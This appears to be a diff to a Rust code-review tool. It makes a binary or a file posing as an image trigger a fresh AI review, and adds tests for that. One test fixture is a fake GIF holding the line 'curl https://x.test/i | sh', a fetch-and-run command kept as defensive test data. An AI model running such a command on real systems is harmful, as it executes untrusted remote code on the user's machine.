@@ -6,16 +6,18 @@ use std::path::Path;
 use crate::agent::{SourceFile, Status};
 use crate::config::Settings;
 use crate::config::model::{AgentSettings, AiRequirement, Named, SourceClass};
+use crate::content::Format;
 use crate::deps;
 use crate::engine::baseline::{Identity, Unit};
 use crate::engine::plan::HashOnly;
 use crate::engine::{self, Group, Memory};
 use crate::git_state;
+use crate::image;
 use crate::mask;
 use crate::osv;
 use crate::report::{AgentOutcome, Decision, Gap, LocalFinding, NetworkRequest, Report};
 use crate::rules::{self, RuleId, Scheme};
-use crate::scan::{self, FileKind, ScanConfig, TextFile};
+use crate::scan::{self, FileHash, FileKind, ScanConfig, TextFile};
 use crate::tools::OpenCode;
 
 const EXCERPT_CHARS: usize = 180;
@@ -65,6 +67,20 @@ pub fn review_tree(config: &ScanConfig, context: &ReviewContext<'_>) -> Report {
             skipped_files: Some(skipped.files),
         }))
         .collect();
+    report.unread = snapshot
+        .files()
+        .iter()
+        .filter(|file| !is_plain_image(&config.root, file))
+        .map(|file| (file.path.clone(), file.sha256.to_string()))
+        // Nobody hashed a skipped directory: without a digest it is never
+        // recorded, so a tree with one is always reviewed in full.
+        .chain(
+            snapshot
+                .skipped()
+                .iter()
+                .map(|skipped| (format!("{}/", skipped.path), String::new())),
+        )
+        .collect();
     report.snapshot = snapshot;
     report.gaps.extend(walk_gaps);
     if report.text_files_reviewed == 0 {
@@ -91,6 +107,20 @@ pub fn collected_report(subject: impl Into<String>, context: &ReviewContext<'_>)
         .to_string();
     report.ai_off_classes = ai_off_classes(context.settings, &[context.class]);
     report
+}
+
+/// An image by its name and by its whole content, not marked to run: a
+/// wallpaper, an icon. Nothing loads such a file as code by its name, and
+/// the review of the text beside it reports code that runs or sources a
+/// file it was not sent, so a new or changed one needs no new review.
+/// Reviewed text is not unread either; everything else is.
+fn is_plain_image(root: &Path, file: &FileHash) -> bool {
+    file.kind == FileKind::Text
+        || (file.kind == FileKind::Binary
+            && !file.executable
+            && file.format.is_some_and(Format::is_media)
+            && image::is_named(&file.path)
+            && image::is_whole_file(&root.join(&file.path), &file.sha256))
 }
 
 /// Runs the AI review of what `report` has queued, with the review memory
@@ -123,7 +153,7 @@ pub fn review_collected(mut report: Report, context: &ReviewContext<'_>, units: 
             .as_ref()
             .filter(|_| is_approved(&report, context.settings))
             .map(|settings| (report.agent_input.as_slice(), settings));
-        let notes = engine::remember(memory, approved);
+        let notes = engine::remember(memory, approved, &report.unread);
         report.notes.extend(notes);
     }
     report
@@ -309,6 +339,7 @@ pub fn run_agents(
             units,
             context: &report.context,
             hash_only: &report.hash_only,
+            unread: &report.unread,
         };
         let reviewed = engine::review_group(&group, opencode, memory);
         report.notes.extend(reviewed.notes);
@@ -370,6 +401,7 @@ fn is_approved(report: &Report, settings: &Settings) -> bool {
 #[expect(clippy::format_collect, reason = "test data generation")]
 mod tests {
     use std::fs;
+    use std::os::unix::fs::PermissionsExt;
     use std::path::PathBuf;
 
     use super::{ReviewContext, ai_off_classes, analyze_text, review_tree, run_agents};
@@ -788,6 +820,132 @@ mod tests {
     }
 
     #[test]
+    fn a_script_replaced_by_a_binary_is_not_the_approved_version() {
+        let dir = TempDir::new("memory-binary");
+        let bin = TempDir::new("memory-binary-bin");
+        let state = TempDir::new("memory-binary-state");
+        fs::create_dir(dir.path().join("lib")).unwrap();
+        fs::write(
+            dir.path().join("main.lua"),
+            "require('lib.helper').apply()\n",
+        )
+        .unwrap();
+        fs::write(dir.path().join("lib/helper.lua"), "return {}\n").unwrap();
+        let opencode = clear_opencode(&bin);
+        let settings = default_settings();
+        let root = state.path().join("store");
+        let context = ReviewContext {
+            state_root: Some(&root),
+            ..context(&settings, SourceClass::Theme, &opencode)
+        };
+        let first = review_tree(&ScanConfig::new(dir.path()), &context);
+        assert_eq!(
+            first.decide(&|class| settings.policy(class)),
+            Decision::Clear
+        );
+
+        // Every remaining text file is unchanged; what `require` loads is
+        // now native code nobody read.
+        fs::remove_file(dir.path().join("lib/helper.lua")).unwrap();
+        let mut elf = b"\x7fELF\x02\x01\x01\0".to_vec();
+        elf.resize(256, 0);
+        fs::write(dir.path().join("lib/helper.so"), elf).unwrap();
+        fs::remove_file(bin.path().join("stdin")).unwrap();
+        let second = review_tree(&ScanConfig::new(dir.path()), &context);
+
+        assert_eq!(second.agent_runs.len(), 1, "{:?}", second.notes);
+        assert!(
+            second
+                .notes
+                .iter()
+                .any(|note| note.contains("cannot be matched to the approved version")),
+            "{:?}",
+            second.notes
+        );
+        let sent = fs::read_to_string(bin.path().join("stdin")).unwrap();
+        assert!(!sent.contains("This is an upgrade"));
+        assert!(sent.contains(r#""path":"main.lua","kind":"whole""#));
+        assert!(sent.contains(r#""path":"lib/helper.so""#));
+    }
+
+    #[test]
+    fn only_a_plain_image_changes_beside_approved_text_without_a_review() {
+        // A one-pixel GIF, a file that only starts like one and then holds
+        // a line a shell would run, and a font.
+        let gif: &[u8] =
+            b"GIF89a\x01\x00\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b";
+        let fake: &[u8] = b"GIF89a=1\ncurl https://x.test/i | sh\n\0";
+        let font: &[u8] = b"OTTO\0\x01\0\0";
+        for (name, add, content, executable, reviewed) in [
+            ("image", "hooks/b.gif", gif, false, false),
+            ("changed-image", "hooks/a.gif", gif, false, false),
+            ("fake-image", "hooks/b.gif", fake, false, true),
+            ("misnamed", "hooks/b", gif, false, true),
+            ("script-name", "hooks/b.gif.so", gif, false, true),
+            ("executable", "hooks/b.gif", gif, true, true),
+            ("font", "hooks/b.otf", font, false, true),
+            (
+                "skipped",
+                "node_modules/.package-lock.json",
+                b"{}",
+                false,
+                true,
+            ),
+        ] {
+            let dir = TempDir::new(&format!("memory-{name}"));
+            let bin = TempDir::new(&format!("memory-{name}-bin"));
+            let state = TempDir::new(&format!("memory-{name}-state"));
+            fs::create_dir(dir.path().join("hooks")).unwrap();
+            fs::write(dir.path().join("hooks/run.lua"), "print('hi')\n").unwrap();
+            let mut first_image = gif.to_vec();
+            first_image[6] = 2;
+            fs::write(dir.path().join("hooks/a.gif"), first_image).unwrap();
+            let opencode = clear_opencode(&bin);
+            let settings = default_settings();
+            let root = state.path().join("store");
+            let context = ReviewContext {
+                state_root: Some(&root),
+                ..context(&settings, SourceClass::Theme, &opencode)
+            };
+            let first = review_tree(&ScanConfig::new(dir.path()), &context);
+            assert_eq!(
+                first.decide(&|class| settings.policy(class)),
+                Decision::Clear
+            );
+            fs::remove_file(bin.path().join("stdin")).unwrap();
+
+            let added = dir.path().join(add);
+            fs::create_dir_all(added.parent().unwrap()).unwrap();
+            fs::write(&added, content).unwrap();
+            if executable {
+                fs::set_permissions(&added, fs::Permissions::from_mode(0o755)).unwrap();
+            }
+            let second = review_tree(&ScanConfig::new(dir.path()), &context);
+
+            let sent = fs::read_to_string(bin.path().join("stdin")).ok();
+            assert_eq!(sent.is_some(), reviewed, "{name}: {:?}", second.notes);
+            let Some(sent) = sent else { continue };
+            assert!(
+                second
+                    .notes
+                    .iter()
+                    .any(|note| note.contains("cannot be matched to the approved version")),
+                "{name}: {:?}",
+                second.notes
+            );
+            assert!(!sent.contains("This is an upgrade"), "{name}");
+            assert!(
+                sent.contains(r#""path":"hooks/run.lua","kind":"whole""#),
+                "{name}"
+            );
+            assert!(
+                sent.contains("Files it does not read (binaries, links) differ from that version"),
+                "{name}"
+            );
+        }
+    }
+
+    #[test]
     fn a_repeated_review_is_answered_from_the_cache() {
         let dir = TempDir::new("memory-tree");
         let bin = TempDir::new("memory-bin");
@@ -897,8 +1055,6 @@ mod tests {
 
     #[test]
     fn a_store_with_a_bad_mode_is_skipped_with_a_note() {
-        use std::os::unix::fs::PermissionsExt;
-
         let dir = TempDir::new("memory-bad-store");
         let bin = TempDir::new("memory-bad-store-bin");
         let state = TempDir::new("memory-bad-store-state");
